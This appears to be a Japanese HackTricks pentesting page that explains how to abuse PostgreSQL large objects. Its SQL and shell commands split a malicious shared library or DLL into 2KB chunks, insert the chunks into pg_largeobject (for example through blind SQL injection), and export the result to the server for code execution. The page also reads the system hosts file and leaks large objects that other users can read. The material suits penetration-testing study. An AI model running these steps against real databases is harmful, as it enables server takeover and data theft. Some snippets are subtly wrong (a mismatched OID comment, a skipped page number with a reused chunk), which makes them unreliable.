<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>


# PostgreSQL Large Objects

PostgreSQLは、**大きなオブジェクト**（`pg_largeobject`テーブル）と呼ばれる構造を公開しており、画像やPDFドキュメントなどのデータをまとめて処理するのに適しています。**大きなオブジェクト**の利点は、**保持しているデータを元のインポートファイルと同じコピーとしてファイルシステムにエクスポートできる**ことです。

このテーブルに**完全なファイルを保存**するには、まず**LOID**で識別されるテーブル内のオブジェクトを**作成**し、その後、このオブジェクトに**2KBのチャンク**を挿入する必要があります。すべての**チャンクが2KB**（最後のチャンクを除く）であるか、**ファイルシステムへのエクスポート**機能が機能しなくなります。

**バイナリ**を**2KBのチャンク**に**分割**するには、次のようにします：
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
各作成されたファイルをBase64またはHexにエンコードするためには、次の方法を使用できます：
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
これを悪用する際には、**2KBのクリアテキストバイトのチャンク**（base64や16進数でエンコードされたバイトではなく）を送信する必要があります。自動化しようとする場合、**16進数でエンコードされた**ファイルのサイズは**2倍**になります（そのため、各チャンクごとに4KBのエンコードされたデータを送信する必要があります）。また、**base64**でエンコードされたファイルのサイズは`ceil(n / 3) * 4`です。
{% endhint %}

また、プロセスのデバッグ中に、作成された大きなオブジェクトの内容を表示することができます。
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# lo\_creatとBase64を使用する

まず、バイナリデータが保存されるLOIDを作成する必要があります。
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
もし**Blind SQLインジェクション**を悪用する場合、**固定されたLOID**を使用して`lo_create`を利用することに興味があるでしょう。これにより、**コンテンツをアップロード**する必要がある**場所がわかる**からです。\
また、関数名は`lo_creat`と`lo_create`で構文エラーはありません。

LOIDは`pg_largeobject`テーブル内のオブジェクトを識別するために使用されます。2KBのサイズのチャンクを`pg_largeobject`テーブルに挿入するには、次のようにします：
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
最後に、ファイルをファイルシステムにエクスポートすることができます（この例では使用されたLOIDは`173454`です）：
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
最新バージョンのPostgreSQLでは、**パスを指定せずに拡張機能をアップロードする**必要がある場合があります。[**詳細はこちらを参照してください**。](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

エクスポート後に作成された大きなオブジェクトを削除することに興味があるかもしれません。
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# lo\_importとHexの使用

このシナリオでは、lo\_importを使用して大きなオブジェクトを作成します。幸いなことに、この場合は使用するLOIDを指定することができます（できないこともあります）。
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
オブジェクトを作成した後、各ページにデータを挿入することができます（注意：2KBのチャンクで挿入する必要があります）。
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
HEXは単に16進数である必要があります（`0x`や`\x`なしで）。例：
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
最後に、データをファイルにエクスポートして大きなオブジェクトを削除します。
```sql
select lo_export(173454, 'C:\\path\to\pg_extension.dll');
select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
最新バージョンのPostgreSQLでは、**パスを指定せずに拡張機能をアップロードする**必要がある場合があります。[**詳細はこちらを参照してください**。](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# 制限事項

PostgreSQLの大規模オブジェクトのドキュメントを読むと、**大規模オブジェクトにはACL（アクセス制御リスト）がある**ことがわかります。**新しい大規模オブジェクト**を設定することで、ユーザーがそれらを読むための十分な権限を持っていない場合でも、ユーザーが作成したオブジェクトの内容を読むことができます。

ただし、**現在のユーザーが読むことを許可するACLを持つ古いオブジェクト**が存在する場合、そのオブジェクトの内容を外部に漏洩させることができます。


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**を**フォロー**してください**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
